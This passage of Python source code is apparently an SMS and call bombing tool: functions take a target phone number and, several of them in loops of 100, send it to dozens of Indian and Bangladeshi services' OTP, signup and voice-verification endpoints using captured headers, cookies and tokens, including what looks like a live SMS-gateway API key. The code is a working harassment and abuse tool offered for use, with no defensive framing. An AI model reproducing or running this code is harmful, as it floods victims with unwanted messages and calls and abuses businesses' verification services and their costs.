            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2',
            'accept-encoding': 'gzip, deflate, br',
            'cookie': 'sid=VwCKAOdskvwBAMG2xSZrbZL8vd99bdRvTMx/Z/YD4NhfjkbIZf2IzF7TQ902OazS9KIv2orueg81btncDxMM1rbq',
        }

        params = (
            ('client_id', 'udaan-v2'),
        )

        data = {
        'mobile': number
        }

        response = requests.post('https://auth.udaan.com/api/otp/send', headers=headers, params=params, data=data);pass

    
        headers = {
            'Host': 'udaan.com',
            'content-length': '29',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': UG,
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://udaan.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://udaan.com/login',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
            'cookie': 's=1kj2b02sprzis1rfarco1px4we',
        }

        params = (
            ('cmd', 'send'),
        )

        data = {
        'try_count': '0',
        'mobile': number
        }

        response = requests.post('https://udaan.com/login', headers=headers, params=params, data=data);pass


        


        headers = {
            'Host': 'api.penpencil.co',
            'content-length': '75',
            'client-version': '2.4.13',
            'user-agent': UG,
            'content-type': 'application/json',
            'accept': 'application/json, text/plain, */*',
            'randomid': 'f518c78d-f241-4db0-a891-9f6524c710b4',
            'client-id': '5eb393ee95fab7468a79d189',
            'client-type': 'WEB',
            'origin': 'https://www.pw.live',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.pw.live/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
        }

        data = '{"mobile": "1234", "countryCode": "+91", "firstName": "Sss", "lastName": ""}'
        data =  data.replace('1234',number)
        # data = json.loa/ds(data);pass
        response = requests.post('https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189', headers=headers, data=data);pass

        



        headers = {
            'Host': 'api.penpencil.co',
            'content-length': '75',
            'client-version': '2.4.13',
            'user-agent': UG,
            'content-type': 'application/json',
            'accept': 'application/json, text/plain, */*',
            'randomid': 'f518c78d-f241-4db0-a891-9f6524c710b4',
            'client-id': '5eb393ee95fab7468a79d189',
            'client-type': 'WEB',
            'origin': 'https://www.pw.live',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.pw.live/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
        }

        data = '{"mobile":"'+number+'","countryCode":"+91","firstName":"Sss","lastName":""}'

        response = requests.post('https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189', headers=headers, data=data);pass





        headers = {
            'Host': 'api.toolsvilla.com',
            'content-length': '66',
            'accept': 'application/json, text/plain, */*',
            'pageurl': '/?gad_source=1&gclid=EAIaIQobChMIqLni4dvuggMVfyR7Bx0LXQcaEAAYASAAEgJY3PD_BwE',
            'user-agent': UG,
            'content-type': 'application/json',
            'origin': 'https://www.toolsvilla.com',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.toolsvilla.com/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
        }

        data = '{"firstname":"","mobileno":"'+number+'","email":"","wtpSubs":"true"}'

        response = requests.post('https://api.toolsvilla.com/web/register', headers=headers, data=data);pass



        headers = {
            'Host': 'goplus.in',
            'Connection': 'keep-alive',
            'Content-Length': '67',
            'deviceId': 'abc',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'Content-Type': 'application/json;charset=UTF-8',
            'Accept': 'application/json',
            'deviceVersion': '0',
            'platform': 'ANDROID',
            'appVersion': 'v1.0',
            'Origin': 'https://mobile.shuttltech.com',
            'X-Requested-With': 'pure.lite.browser',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://mobile.shuttltech.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
        }

        data = '{"phoneNumber":"'+number+'","newDevice":"false","policyPerused":true}'

        response = requests.post('https://goplus.in/v3/auth/user/otp', headers=headers, data=data);pass







        headers = {
            'Host': 'api.cureskin.com',
            'content-length': '299',
            'baggage': 'sentry-environment=production,sentry-release=app%402.0.462,sentry-public_key=f50a2ba984c66e974c85651f3672ff35,sentry-trace_id=6c8710e4d4ae4b8c9d4386cb86768fc3',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'sentry-trace': '6c8710e4d4ae4b8c9d4386cb86768fc3-93f53738ec36fd4f-0',
            'content-type': 'text/plain',
            'accept': '*/*',
            'origin': 'https://app.cureskin.com',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://app.cureskin.com/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
        }

        data = '{"mobileNumber":"'+number+'","deviceId":"f63754ef4d120ddb59d4","source":"web","time":"2023-12-01T16:29:33.767Z","digest":"ce95fea5ec919a57325732a7fbdec2d75232ec27a95ecc28f7bf7e04e70e55f6","_ApplicationId":"myAppId","_ClientVersion":"js3.4.4","_InstallationId":"12d7f289-c92d-4ce8-9e77-ad3bf4deaf8f"}'

        response = requests.post('https://api.cureskin.com/api/parse/functions/requestOTP', headers=headers, data=data);pass



        headers = {
            'Host': 'loginprod.medibuddy.in',
            'content-length': '202',
            'accept': 'application/json, text/plain, */*',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'content-type': 'application/json',
            'origin': 'https://www.medibuddy.in',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.medibuddy.in/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
        }

        data = '{"source":"medibuddyInWeb","platform":"medibuddy","phonenumber":"'+number+'","flow":"Retail-Login-Home-Flow","idealLoginFlow":false,"advertiserId":"8f191ec6-b5c8-Ld51-830f-65892ff7fb13","mbUserId":null}'

        response = requests.post('https://loginprod.medibuddy.in/unified-login/user/register', headers=headers, data=data);pass



        headers = {
            'Host': 'unacademy.com',
            'content-length': '107',
            'x-platform': '7',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'content-type': 'application/json',
            'accept': '*/*',
            'origin': 'https://unacademy.com',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://unacademy.com/login?redirectTo=%2Fsettings',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
            'cookie': 'anonymous_session_id=aae2b19d_5c59_44ba_aa88_f50a8b49ffd5',
        }

        params = (
            ('enable-email', 'true'),
        )

        data = '{"phone":"'+number+'","country_code":"IN","otp_type":1,"email":"","send_otp":"true","is_un_teach_user":false}'

        response = requests.post('https://unacademy.com/api/v3/user/user_check/', headers=headers, params=params, data=data);pass





        cookies = {
            'cookie:campaignCookienew': '{"utm_medium":"bfl","utm_campaign":NA,"utm_keyword":NA,"utm_content":NA,"utm_source":"organic_myaccount"}',
        }

        headers = {
            'Host': 'www.bajajfinserv.in',
            'content-length': '136',
            'tracestate': '2442591@nr=0-1-2364187-1120225423-a1676216f73520a0----1701447794700',
            'traceparent': '00-53e72ff78740605b404c2a4ce9009e00-a1676216f73520a0-01',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjIzNjQxODciLCJhcCI6IjExMjAyMjU0MjMiLCJpZCI6ImExNjc2MjE2ZjczNTIwYTAiLCJ0ciI6IjUzZTcyZmY3ODc0MDYwNWI0MDRjMmE0Y2U5MDA5ZTAwIiwidGkiOjE3MDE0NDc3OTQ3MDAsInRrIjoiMjQ0MjU5MSJ9fQ==',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'accept': '*/*',
            'x-requested-with': 'XMLHttpRequest',
            'request-id': '|0f55808691fe4f568fde7ae869c35b20.a2f8bbb358924c93',
            'origin': 'https://www.bajajfinserv.in',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.bajajfinserv.in/myaccountlogin/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
            'cookie': 'kampyleSessionPageCounter=1',
        }

        data = {
        'CLType': 'INDIVIDUAL',
        'Mobile_Email': number,
        'DOB': '',
        'Pan_No': '',
        'IP': '',
        'Device': '',
        'Device_Info': '',
        'Browser_Type': 'Safari',
        'Source': 'Login',
        'LoginType': '1',
        'EventClick': ''
        }

        response = requests.post('https://www.bajajfinserv.in/MyAccountLogin/Login/GetOTP', headers=headers, cookies=cookies, data=data);pass



        headers = {
            'Host': 'www.my11circle.com',
            'content-length': '123',
            'cache-control': 'max-age=0',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'content-type': 'application/json',
            'accept': '*/*',
            'origin': 'https://www.my11circle.com',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.my11circle.com/player/login.html',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
            'cookie': 'ga24x7_pixeltracker=from_page%3Dlogin.html%26referrer_url%3D',
        }

        data = '{"mobile":"'+number+'","deviceId":"03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1","deviceName":"","refCode":"","isPlaycircle":false}'

        response = requests.post('https://www.my11circle.com/api/fl/auth/v3/getOtp', headers=headers, data=data);pass


        headers = {
            'Host': 'www.rummycircle.com',
            'content-length': '123',
            'cache-control': 'max-age=0',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'content-type': 'application/json',
            'accept': '*/*',
            'origin': 'https://www.rummycircle.com',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.rummycircle.com/loginnow.html',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
            'cookie': 'AWSALBCORS=1tS0LdJM+fFwf4IHgfQpZbU6wVU1Rd6+xr7qaWCxlF1jYyVHAvY2I2Fua8JNR5whrvS/xBuubwutIJi+o4mDObqaVQKCCTZ99oMcFQSLtfGniKBTsRwSYvbBa8af',
        }

        data = '{"mobile":"'+number+'","deviceId":"6ebd671c-a5f7-4baa-904b-89d4f898ee79","deviceName":"","refCode":"","isPlaycircle":false}'

        response = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', headers=headers, data=data);pass



    # sms(number=number)

def bgl(number):
    number = str(number)

    for i in range(100):

        url1 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0" + number

        url2 = "https://www.bioscopelive.com/en/login/send-otp?phone=880" + number + "&operator=bd-otp"

        headers2 = CaseInsensitiveDict()
        headers2["referer"] = "https://www.bioscopelive.com/en/login?type=login"
        url3 = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
        headers3 = CaseInsensitiveDict()
        headers3["Content-Type"] = "application/json"
        data3 = '{"msisdn":"' + number + '"}'
        url4 = "https://fundesh.com.bd/api/auth/resendOTP"
        headers4 = CaseInsensitiveDict()
        headers4["Content-Type"] = "application/json"
        data4 = '{"msisdn":"' + number + '"}'
        url5 = "https://api.redx.com.bd/v1/user/signup"

        headers5 = CaseInsensitiveDict()
        headers5["Accept"] = "application/json, text/plain, */*"
        headers5["Accept-Encoding"] = "gzip, deflate, br"
        headers5["Accept-Language"] = "en-US,en;q=0.5"
        headers5["Connection"] = "keep-alive"
        headers5["Content-Length"] = "65"
        headers5["Content-Type"] = "application/json"
        headers5[
            "Cookie"] = "_ga=GA1.3.1117093475.951445077; _gid=GA1.3.134905361.951445077; WZRK_S_4R6-9R6-155Z=%7B%22p%22%3A1%2C%22s%22%3A951410497%2C%22t%22%3A951445096%7D; WZRK_G=6184e322525e444ab0f771f7f041933a; _fbp=fb.2.951445106167.1213159921; _hjSessionUser_2064965=eyJpZCI6ImRhMmMzMDY1LWNkMDYtNWFlOC04NTA4LTg0MzYzYWM4Y2RiNyIsImNyZWF0ZWQiOjE2NTE0NDUxMDkwMjMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMxMGI0MDQ2LTY3OGUtNDM2OS1hOWY1LTRlYzlmOWEyMDhkNCIsImNyZWF0ZWQiOjE2NTE0NDUxMTg1NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1"
        headers5["Host"] = "api.redx.com.bd"
        headers5["Origin"] = "https://redx.com.bd"
        headers5["Referer"] = "https://redx.com.bd/registration/"
        headers5["TE"] = "Trailers"
        headers5["User-Agent"] = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
        headers5["x-access-token"] = "Bearer null"

        data5 = '{"name":"961096106","phoneNumber":"' + number + '","service":"redx"}'
        url6 = "https://api.bongo-solutions.com/auth/api/login/send-otp"
        headers6 = CaseInsensitiveDict()
        headers6["Content-Type"] = "application/json"
        data6 = '{"operator":"all","msisdn":"880' + number + '"}'
        url7 = "https://www.rokomari.com/resend-verification-code?email_phone=880" + number

        url8 = "https://www.pizzahutbd.com/customer/sign-in/mobile"

        headers8 = CaseInsensitiveDict()
        headers8[
            "Cookie"] = "XSRF-TOKEN=eyJpdiI6InNuQmtkMnFVT2xzT0I3eWhqbW5neHc9PSIsInZhbHVlIjoib3NEdnYrZUpuQWpoZ0dEcnJNT2VxVHd2M21acHFxWURzWXdYdlQrZVN2YTZlTGxWUktjUlllZEpxS0xpdG9odSIsIm1hYyI6IjM3N2ZmMjkyM2I4NmE2N2E5MjBmMzAzNThmMGQ0MTU0M2M0MmFlYTZiODkzYTc0MGY0M2JhZGNiNGMyMmNkNmYifQ%3D%3D; laravel_session=eyJpdiI6Ik13OW9FMzkraEprMlRVY0d1Z0dcL2hRPT0iLCJ2YWx1ZSI6InBzcVVOdnpVOEFoMllrdVJMeDhJdndvSGtOYWlJd3lzbzdFSVY4OXNOZWpDdFIrWVU0UzNwcWVEcHlcL1NscXZMIiwibWFjIjoiMWZiMDBkNDc3ZDJjNDYzYTU1NjAxOWRmZDBmZTFlNjVhNDlkOTljMjM5YmYxZmUxY2NhMDE5YjBmZjdkODU1MiJ9; _fbp=fb.1.95760618126.170097696; _ga_Y46ECXC3WS=GS1.1.957606120.1.1.957606120.0; _ga=GA1.2.157655917.957606120; _gid=GA1.2.1912717920.957606120; _gat_gtag_UA_80641075_1=1"
        headers8["Content-Type"] = "application/x-www-form-urlencoded"

        data8 = "_token=t7I6C5hDF7XgnfD5rNkeEloIbGlS71lpa6tHZMPh&phone_number=0" + number

        url9 = "https://admission.ndub.edu.bd/api/users/register-step-1/"

        headers9 = CaseInsensitiveDict()
        headers9["Content-Type"] = "application/json"

        data9 = '{"name":"asad","email":"abcd@gmail.com","phone":"0' + number + '","password":"1q2w3e4r","confirmPassword":"1q2w3e4r"}'
        url10 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
        headers10 = CaseInsensitiveDict()
        headers10["Content-Type"] = "application/json"
        data10 = '{"phone":"0' + number + '","country_code":"+880","fcm_token":null}'
        url11 = "https://api.shikho.com/auth/v2/send/sms"

        headers11 = CaseInsensitiveDict()
        headers11["Content-Type"] = "application/json"

        data11 = '{"phone":"0' + number + '","email":null,"auth_type":"login"}'
        url12 = 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv'
        data12 = {'requestType': 'send', 'phoneNumber': '+880' + number, 'emailConsent': 'true', 'whatsappConsent': 'true'}

        url13 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

        headers13 = CaseInsensitiveDict()
        headers13["Content-Type"] = "application/json"

        data13 = """
        {
        "AccessToken": "",
        "TrackingNo": "",
        "mobileNo": "0""""" + number + """",
        "otpSms": "",
        "product_id": "201",
        "requestChannel": "MOB",
        "trackingStatus": 5
        }
        """

        url14 = "https://www.walcart.com/easylogin/account/mobilecheck/"

        headers14 = CaseInsensitiveDict()
        headers14["X-Requested-With"] = "XMLHttpRequest"
        headers14["Content-Type"] = "application/x-www-form-urlencoded"

        data14 = "mobile=0" + number + "&is_login=true&forgetpass=false"
        url15 = "https://themallbd.com/api/auth/otp_login"

        headers15 = CaseInsensitiveDict()
        headers15["Content-Type"] = "application/json"

        data15 = '{"phone_number":"+880' + number + '"}'
        url16 = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web"

        headers16 = CaseInsensitiveDict()
        headers16["Host"] = "api.ghoorilearning.com"
        headers16["Origin"] = "https://ghoorilearning.com"
        headers16["Referer"] = "https://ghoorilearning.com/"
        headers16["Content-Type"] = "application/json"

        data16 = '{"name":"asad","mobile_no":"0' + number + '","password":"WzfTW4Cecz7NjAm","confirm_password":"WzfTW4Cecz7NjAm"}'
        url17 = "https://api.wholesalecart.com/v2/user/login-register"

        headers17 = CaseInsensitiveDict()
        headers17["Accept-Encoding"] = "gzip, deflate, br"
        headers17["Accept-Language"] = "en-US,en;q=0.5"
        headers17["Connection"] = "keep-alive"
        headers17["Content-Length"] = "75"
        headers17["Content-Type"] = "application/json"
        headers17["Host"] = "api.wholesalecart.com"
        headers17["Origin"] = "https://wholesalecart.com"
        headers17["Referer"] = "https://wholesalecart.com/login"
        headers17["User-Agent"] = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"

        data17 = '{"phone":"0' + number + '","platform":"google","url":"https://www.google.com/"}'

        url18 = "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp"

        headers18 = CaseInsensitiveDict()
        headers18["Content-Type"] = "application/json"

        data18 = '{"phone":"0' + number + '"}'
        url19 = "https://app.ipay.com.bd/api/v1/signup/v2"

        headers19 = CaseInsensitiveDict()
        headers19["Content-Type"] = "application/json"

        data19 = '{"accountType":1,"deviceId":"mobile-android-SM-N971N-a23e77d4428c3d91","mobileNumber":"+880' + number + '"}'
        url20 = "https://admission.ndub.edu.bd/api/users/reset/"
        headers20 = CaseInsensitiveDict()
        headers20["Content-Type"] = "application/json"
        data20 = '{"phone": "0' + number + '"}'



        resp1 = requests.get(url1)
        # print(f"{resp1.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp2 = requests.get(url2, headers=headers2)
        # print(f"{resp2.text}[SMS SENT SUCCESFULLY]🔰  ")

        resp3 = requests.post(url3, headers=headers3, data=data3)
        # print(f"{resp3.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp4 = requests.post(url4, headers=headers4, data=data4)
        # print(f"{resp4.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp5 = requests.post(url5, headers=headers5, data=data5)
        # print(f"{resp5.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp6 = requests.post(url6, headers=headers6, data=data6)
        # print(f"{resp6.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp7 = requests.get(url7)
        # print(f"{resp7.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp10 = requests.get(url8, headers=headers8, data=data8)
        # print(f"{resp10.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp11 = requests.get(url9, headers=headers9, data=data9)
        # print(f"{resp11.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp12 = requests.post(url10, headers=headers10, data=data10)
        # print(f"{resp12.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp13 = requests.get(url11, headers=headers11, data=data11)
        # print(f"{resp13.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp14 = requests.post(url12, data=data12)
        # print(f"{resp14.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp8 = requests.post(url13, headers=headers13, data=data13)
        # print(f"{resp8.text}[SMS SENT SUCCESFULLY]🔰 ")

        # resp17 = requests.post(url14, headers=headers14, data=data14)
        # print(f"{resp17.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp9 = requests.post(url15, headers=headers15, data=data15)
        # print(f"{resp9.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp19 = requests.post(url16, headers=headers16, data=data16)
        # print(f"{resp19.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp20 = requests.post(url17, data17)
        # print(f"{resp20.text}[SMS SENT SUCCESFULLY]🔰  ")

        resp21 = requests.post(url18, headers=headers18, data=data18)
        # print(f"{resp21.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp21 = requests.post(url19, headers=headers19, data=data19)
        # print(f"{resp21.text}[SMS SENT SUCCESFULLY]🔰 ")

        resp21 = requests.post(url20, headers=headers20, data=data20)
        # print(f"{resp21.text}[SMS SENT SUCCESFULLY]🔰 ")



def mixl(number):
    number = str(number)

    for i in range(100):

        headers = {
            'sec-fetch-mode': 'cors',
            'referer': 'https://m.cricbuzz.com/premium-subscription/user/sign-up',
            'sec-fetch-site': 'same-origin',
            'accept-language': 'en-US,en;q=0.9',
            'origin': 'https://m.cricbuzz.com',
            'accept': '*/*',
            'sec-ch-ua': 'Not_A',
            'sec-ch-ua-mobile': '?1',
            'authority': 'm.cricbuzz.com',
            'sec-ch-ua-platform': 'Android',
            'content-type': 'application/json',
            'sec-fetch-dest': 'empty',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Host': 'm.cricbuzz.com',
            'Connection': 'Keep-Alive',
            # 'Accept-Encoding': 'gzip',
            # 'Content-Length': '41',
        }

        data = '{username:'+number+'}'
        response = requests.post('https://m.cricbuzz.com/api/cbplus/auth/user/sign-up', headers=headers, data=data)

        headers = {
            'referer': 'https://www.bakingo.com/',
            'sec-ch-ua-mobile': '?1',
            'accept-language': 'en-US,en;q=0.9',
            'authority': 'apis.bakingo.com',
            'origin': 'https://www.bakingo.com',
            'sec-ch-ua-platform': 'Android',
            'content-type': 'application/json;charset=UTF-8',
            'accept': 'application/json, text/plain, */*',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Host': 'apis.bakingo.com',
            'Connection': 'Keep-Alive',
            # 'Accept-Encoding': 'gzip',
            # 'Content-Length': '127',
        }

        params = {
            'user_email': number,
            'user_mobile': '4841748515',
            'user_name': 'jabjhsb',
            'resend_otp': '0',
            'country_code': '91',
        }

        data = '{country_code:91,user_email:'+number+',resend_otp:0,user_mobile:4512526585,user_name:singh}'

        response = requests.post('https://apis.bakingo.com/api/bakingo/fa/users/sendOtp', params=params, headers=headers, data=data)

def okkg(number):
    number =  str(number)
    
    headers = {
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    response = requests.get(
        'https://sgmaart.com/index.php?route=account/register/getotp&user_token=&mobile='+number,
        headers=headers,
    )


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'receiverPhoneNumber': number,
    }

    response = requests.get('https://vlccbackend.happly.in/rest/V1/api/sendvoiceotp', params=params, headers=headers)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'medium': 'android',
        'mobile': '+91'+number,
        'whatsapp': '1',
    }

    response = requests.get('https://force.eazydiner.com/4.0/otp', params=params, headers=headers)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'authorization': '3MlQEjivDt4sTuNKwCSm9VpUk21y76qOA0crXaZPW5YzxLGhob017d9kXLUaY6jEMQvhHPeprt84GR5z',
        'route': 'otp',
        'variables_values': '99999999',
        'numbers': number,
    }

    response = requests.get('https://www.fast2sms.com/dev/voice', params=params, headers=headers)


    headers = {
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    params = {
        'identifier': 'callmade',
        'mobile': number,
    }

    response = requests.get('https://api.magicbricks.com/bricks/verifyOnCall.html', params=params, headers=headers)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'plt': '2',
        'st': '1',
    }

    response = requests.get(
        'https://www.healthkart.com/veronica/user/validate/voice/1/'+number+'/signup',
        params=params,
        headers=headers,
    )


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    response = requests.get('https://www.nearbuy.com/mobile/api/user/otp/resend/'+number+'/CALL', headers=headers)


    headers = {
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    params = {
        'searchtype': 'mobile',
        'term': number,
        'checkEnableForBoss': 'true',
    }

    response = requests.get('https://maxapp.in/patient-search', params=params, headers=headers)


    headers = {
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    params = {
        'mobile': '91'+number,
        '_': '1704750115805',
    }

    response = requests.get('https://www.store4riders.com/mobilelogin/index/sentotpbyreg/', params=params, headers=headers)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'smsType': '1',
    }

    json_data = {
        'organizationId': '5eb393ee95fab7468a79d189',
        'mobile': number,
    }

    response = requests.post('https://api.penpencil.co/v1/users/resend-otp', params=params, headers=headers, json=json_data)

    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phoneNumber': '+91'+number,
        'otp': '',
    }

    response = requests.post('https://api.fancraze.com/v1_6/auth/phoneV2', headers=headers, json=json_data)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    response = requests.get(
        'https://vlccbackend.happly.in/rest/V1/api/registrationsendsms?receiverPhoneNumber='+number+'&email=Shivamrajput6006@gmail.com&storeId=1&type=otp',
        headers=headers,
    )


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'countryCode': '91',
        'p_n': '+91'+number,
    }

    response = requests.post('https://api.rigi.club/api/account/sendotp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'firstname': 'Raghav',
        'mobileno': number,
        'email': 'Ravajttgit@gmail.com',
    }

    response = requests.post('https://api.toolsvilla.com/web/register', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobNum': number,
        'type': 'sellOnly',
    }

    response = requests.post('https://prodapi.credr.com/web/generateOtp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'is_resend_request': True,
        'countryCode': '91',
        'p_n': '+91'+number,
    }

    response = requests.post('https://api.rigi.club/api/account/sendotp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'signInMobile': '+91'+number,
    }

    response = requests.post('https://www.lifestylestores.com/in/en/mobilelogin/sendOTP', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile': number,
    }

    response = requests.post('https://profile.swiggy.com/api/v3/app/request_call_verification', headers=headers, json=json_data)







    headers = {
